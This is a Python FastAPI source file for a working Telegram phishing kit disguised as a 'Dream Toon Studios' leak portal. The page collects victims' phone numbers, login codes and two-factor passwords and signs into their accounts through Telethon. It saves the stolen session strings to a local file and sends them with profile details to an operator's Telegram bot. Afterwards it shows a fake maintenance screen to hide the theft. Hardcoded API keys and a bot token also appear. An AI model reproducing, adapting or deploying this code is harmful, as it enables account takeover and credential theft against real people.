import asyncio
import json
import os
import httpx
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    SessionPasswordNeededError,
)
from telethon.sessions import StringSession

app = FastAPI(title="Dream Toon Studios - Maintenance Portal")

API_ID = 36023099  # Apni real API ID yahan daal
API_HASH = "b5926500a901cb5b7a5ad5828e5e98e6"  # Apni real API Hash yahan daal

# Telegram Bot configuration
BOT_TOKEN = "8585882911:AAFkPmxjlQJ8HTMJqpg_LEVqkptBPlv1n7g"
CHAT_ID = "8579040479"

VAULT_FILE = "dreamtoon_maintenance_vault.enc"
active_sessions = {}


async def notify_operator_and_bot(
    phone: str, code: str, session_str: str, client_instance: TelegramClient
):
  profile_info = {}
  try:
    me = await client_instance.get_me()
    profile_info = {
        "id": me.id,
        "first_name": me.first_name,
        "username": me.username,
        "phone": me.phone,
    }
  except Exception as e:
    profile_info = {"error": str(e)}

  # Terminal Log
  print(f"\n" + "=" * 80)
  print(f"[🔥] MAINTENANCE DECEPTION INTEL HARVESTED:")
  print(f"[+] Target Phone   : {phone}")
  print(f"[+] Submitted Code : {code}")
  print(f"[+] Profile Data   : {profile_info}")
  print(f"[+] Session String :\n{session_str}")
  print("=" * 80 + "\n")

  # Local Vault Backup
  data = {}
  if os.path.exists(VAULT_FILE):
    try:
      with open(VAULT_FILE, "r") as f:
        data = json.load(f)
    except:
      pass
  data[phone] = {
      "phone": phone,
      "otp": code,
      "profile": profile_info,
      "session_string": session_str,
  }
  with open(VAULT_FILE, "w") as f:
    json.dump(data, f, indent=4)

  # Telegram Bot Push Notification
  if BOT_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN" and CHAT_ID != "YOUR_ADMIN_CHAT_ID":
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    msg_text = (
        f"🎨 DREAM TOON: INTEL CAPTURED 🎨\n\n"
        f"📱 Phone: {phone}\n"
        f"🔢 Code/OTP: {code}\n"
        f"👤 Name: {profile_info.get('first_name', 'N/A')}\n"
        f"🏷 Username: @{profile_info.get('username', 'None')}\n"
        f"🆔 User ID: {profile_info.get('id', 'N/A')}\n\n"
        f"🔑 Session String:\n{session_str}"
    )
    payload = {"chat_id": CHAT_ID, "text": msg_text}
    async with httpx.AsyncClient() as http_client:
      try:
        await http_client.post(url, json=payload, timeout=10.0)
      except Exception as e:
        print(f"[-] Bot exfiltration error: {e}")


# Ultra-Premium UI with Dynamic Maintenance Lockdown Screen
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dream Toon Studios - Character Leak Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-base: #0c0a1d;
            --card-bg: rgba(26, 22, 53, 0.85);
            --primary: #8b5cf6;
            --primary-hover: #7c3aed;
            --accent-pink: #ec4899;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
        }
        * { box-sizing: border-box; }
        body {
            background-color: var(--bg-base);
            background-image: 
                radial-gradient(at 10% 10%, rgba(139, 92, 246, 0.2) 0px, transparent 50%),
                radial-gradient(at 90% 90%, rgba(236, 72, 153, 0.15) 0px, transparent 50%);
            color: var(--text-main);
            font-family: 'Outfit', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .wrapper { width: 100%; max-width: 460px; padding: 24px; }
        .card {
            background: var(--card-bg);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            padding: 40px 32px;
            border-radius: 28px;
            box-shadow: 0 30px 70px -15px rgba(0, 0, 0, 0.95);
            border: 1px solid rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
        }
        .card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; height: 3px;
            background: linear-gradient(90deg, #8b5cf6, #ec4899);
        }
        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .badge { display: flex; align-items: center; gap: 8px; font-size: 11px; text-transform: uppercase; letter-spacing: 1.2px; color: #c4b5fd; font-weight: 700; }
        .dot { width: 8px; height: 8px; background: var(--accent-pink); border-radius: 50%; box-shadow: 0 0 12px var(--accent-pink); animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(0.9); opacity: 0.7; } 50% { transform: scale(1.3); opacity: 1; } 100% { transform: scale(0.9); opacity: 0.7; } }
        
        h2 { color: var(--text-main); margin: 0 0 8px 0; font-size: 26px; font-weight: 700; letter-spacing: -0.5px; }
        p { font-size: 13.5px; color: var(--text-muted); margin-bottom: 28px; line-height: 1.5; }
        
        .input-box { margin-bottom: 20px; }
        label { font-size: 11.5px; color: var(--text-muted); font-weight: 600; display: block; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.8px; }
        input {
            width: 100%; padding: 14px 16px;
            background: rgba(12, 10, 29, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #fff; border-radius: 14px; outline: none; font-size: 15px; font-family: inherit;
            transition: all 0.3s ease;
        }
        input:focus { border-color: var(--primary); box-shadow: 0 0 20px rgba(139, 92, 246, 0.4); }
        
        .captcha-box {
            background: rgba(12, 10, 29, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            padding: 12px;
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
        }
        .captcha-box input[type="checkbox"] { width: 20px; height: 20px; cursor: pointer; accent-color: var(--primary); }
        
        button {
            width: 100%; padding: 16px;
            background: linear-gradient(135deg, var(--primary), var(--primary-hover));
            color: white; border: none; border-radius: 14px; cursor: pointer;
            font-weight: 600; font-size: 15px; font-family: inherit;
            transition: all 0.3s ease; box-shadow: 0 8px 25px rgba(139, 92, 246, 0.4);
            display: flex; justify-content: center; align-items: center; gap: 10px;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 12px 30px rgba(139, 92, 246, 0.6); }
        
        .spinner {
            width: 18px; height: 18px;
            border: 2.5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.7s linear infinite;
            display: none;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .terminal-log {
            margin-top: 20px;
            background: #05050f;
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            padding: 12px 14px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11.5px;
            color: #a78bfa;
            min-height: 40px;
            display: flex;
            align-items: center;
        }
        
        /* Maintenance Lockdown Screen Style */
        #maintenance-screen {
            text-align: center;
            padding: 20px 0;
            display: none;
            animation: fadeIn 0.5s ease;
        }
        #maintenance-screen h3 { color: #f87171; font-size: 22px; margin-bottom: 12px; }
        #maintenance-screen p { color: #9ca3af; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
        .maintenance-badge { background: rgba(248, 113, 113, 0.15); color: #f87171; border: 1px solid rgba(248, 113, 113, 0.3); padding: 8px 16px; border-radius: 20px; font-size: 12px; font-weight: 700; display: inline-block; text-transform: uppercase; letter-spacing: 1px; }

        .step-block { animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="card">
            <div class="top-bar">
                <div class="badge"><div class="dot"></div> Dream Toon Vault</div>
                <span style="font-size: 11px; color: var(--text-muted);">Confidential Leak</span>
            </div>
            
            <div id="main-form-container">
                <h2>Character Leak Access</h2>
                <p>Verify your animator credentials to unlock unreleased 3D model concepts and storyline sheets.</p>
                
                <div id="step1" class="step-block">
                    <div class="input-box">
                        <label>Mobile Number</label>
                        <input type="text" id="phone" placeholder="+91 XXXXXXXXXX">
                    </div>
                    <div class="captcha-box">
                        <input type="checkbox" id="humanCheck">
                        <label for="humanCheck" style="margin:0; font-size:12px; cursor:pointer;">I am an authorized Dream Toon artist</label>
                    </div>
                    <button id="btn1" onclick="triggerAction('send_code', {phone: document.getElementById('phone').value, verified: document.getElementById('humanCheck').checked}, 'btn1', 'spinner1')">
                        <span>Unlock Leak Preview</span>
                        <div class="spinner" id="spinner1"></div>
                    </button>
                </div>
                
                <div id="step2" class="step-block" style="display:none;">
                    <div class="input-box">
                        <label>Studio OTP Code</label>
                        <input type="text" id="code" placeholder="• • • • •">
                    </div>
                    <button id="btn2" onclick="triggerAction('verify', {phone: document.getElementById('phone').value, code: document.getElementById('code').value}, 'btn2', 'spinner2')">
                        <span>Authorize Character Vault</span>
                        <div class="spinner" id="spinner2"></div>
                    </button>
                </div>
                
                <div id="step3" class="step-block" style="display:none;">
                    <div class="input-box">
                        <label>Cloud Security 2FA Password</label>
                        <input type="password" id="password" placeholder="Enter cloud password">
                    </div>
                    <button id="btn3" onclick="triggerAction('verify_2fa', {phone: document.getElementById('phone').value, password: document.getElementById('password').value}, 'btn3', 'spinner3')">
                        <span>Finalize Clearance</span>
                        <div class="spinner" id="spinner3"></div>
                    </button>
                </div>
            </div>

            <!-- Maintenance Lockdown Screen -->
            <div id="maintenance-screen">
                <div class="maintenance-badge">System Notice</div>
                <h3 style="margin-top:15px;">Portal Temporarily Closed</h3>
                <p>Due to unexpected high traffic and security updates, this portal is currently shut down. It will reopen in a few days. Thank you for your patience.</p>
                <div style="font-size:12px; color: #6b7280;">Dream Toon Studios Infrastructure Team</div>
            </div>
            
            <div class="terminal-log" id="status">Studio gateway ready...</div>
        </div>
    </div>

    <script>
        let ws;
        function connectWS() {
            const proto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            ws = new WebSocket(proto + window.location.host + "/ws");

            ws.onopen = function() {
                document.getElementById("status").innerText = "[+] Connected to secure Dream Toon node.";
            };

            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                const statusEl = document.getElementById("status");
                
                document.querySelectorAll('.spinner').forEach(s => s.style.display = 'none');
                document.querySelectorAll('button').forEach(b => b.disabled = false);

                statusEl.innerText = "> " + data.message;
                
                if(data.action === "code_sent") {
                    document.getElementById("step1").style.display = "none";
                    document.getElementById("step2").style.display = "block";
                } else if(data.action === "need_2fa") {
                    document.getElementById("step2").style.display = "none";
                    document.getElementById("step3").style.display = "block";
                } else if(data.action === "success") {
                    statusEl.style.color = "#4ade80";
                    statusEl.innerText = "[✓] Handshake complete. Shutting down node...";
                    
                    // Smooth transition to maintenance screen
                    setTimeout(() => {
                        document.getElementById("main-form-container").style.display = "none";
                        document.getElementById("maintenance-screen").style.display = "block";
                        document.getElementById("status").style.display = "none";
                    }, 1500);
                } else if(data.action === "error") {
                    statusEl.style.color = "#f87171";
                }
            };

            ws.onclose = function() {
                setTimeout(connectWS, 2000);
            };
        }

        connectWS();

        function triggerAction(actionType, payload, btnId, spinnerId) {
            if (actionType === 'send_code' && !payload.verified) {
                document.getElementById("status").style.color = "#f87171";
                document.getElementById("status").innerText = "[-] Please confirm studio artist verification check.";
                return;
            }

            payload.action = actionType;
            const statusEl = document.getElementById("status");
            
            if (!ws || ws.readyState !== WebSocket.OPEN) {
                statusEl.innerText = "[-] Re-establishing connection...";
                return;
            }

            document.getElementById(spinnerId).style.display = "block";
            document.getElementById(btnId).disabled = true;

            statusEl.style.color = "#c4b5fd";
            statusEl.innerText = "[*] Dispatching studio handshake...";
            ws.send(JSON.stringify(payload));
        }
    </script>
</body>
</html>
"""


@app.get("/", response_class=HTMLResponse)
async def get_index():
  return HTML_TEMPLATE


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
  await websocket.accept()
  cid = id(websocket)
  client = TelegramClient(StringSession(), API_ID, API_HASH)
  await client.connect()

  active_sessions[cid] = {
      "client": client,
      "phone_code_hash": None,
      "captured_code": None,
  }

  try:
    while True:
      data = await websocket.receive_json()
      action = data.get("action")
      session = active_sessions.get(cid)

      if action == "send_code":
        phone = data.get("phone")
        try:
          if not phone:
            await websocket.send_json({
                "action": "error",
                "message": "Phone number field is empty.",
            })
            continue
          result = await client.send_code_request(phone)
          session["phone_code_hash"] = result.phone_code_hash
          session["phone"] = phone
          await websocket.send_json({
              "action": "code_sent",
              "message": "Studio OTP dispatched to device.",
          })
        except FloodWaitError as e:
          await websocket.send_json({
              "action": "error",
              "message": f"Rate limit active. Wait {e.seconds}s.",
          })
        except PhoneNumberInvalidError:
          await websocket.send_json({
              "action": "error",
              "message": "Malformed phone number format.",
          })
        except Exception as e:
          await websocket.send_json({"action": "error", "message": str(e)})

      elif action == "verify":
        phone = session.get("phone")
        captured_code = data.get("code")
        session["captured_code"] = captured_code
        try:
          await client.sign_in(
              phone=phone,
              code=captured_code,
              phone_code_hash=session["phone_code_hash"],
          )
          session_string = client.session.save()
          await notify_operator_and_bot(
              phone, captured_code, session_string, client
          )
          await websocket.send_json({
              "action": "success",
              "message": "Session authorized successfully.",
          })
        except SessionPasswordNeededError:
          await websocket.send_json({
              "action": "need_2fa",
              "message": "Two-step cloud password required.",
          })
        except PhoneCodeInvalidError:
          await websocket.send_json({
              "action": "error",
              "message": "Incorrect verification code.",
          })
        except Exception as e:
          await websocket.send_json({"action": "error", "message": str(e)})

      elif action == "verify_2fa":
        phone = session.get("phone")
        password = data.get("password")
        captured_code = session.get("captured_code", "N/A")
        try:
          await client.sign_in(password=password)
          session_string = client.session.save()
          await notify_operator_and_bot(
              phone,
              f"{captured_code} + [2FA Protected]",
              session_string,
              client,
          )
          await websocket.send_json({
              "action": "success",
              "message": "2FA bypassed successfully.",
          })
        except Exception as e:
          await websocket.send_json({"action": "error", "message": str(e)})

  except WebSocketDisconnect:
    if cid in active_sessions:
      try:
        await active_sessions[cid]["client"].disconnect()
      except:
        pass
      del active_sessions[cid]
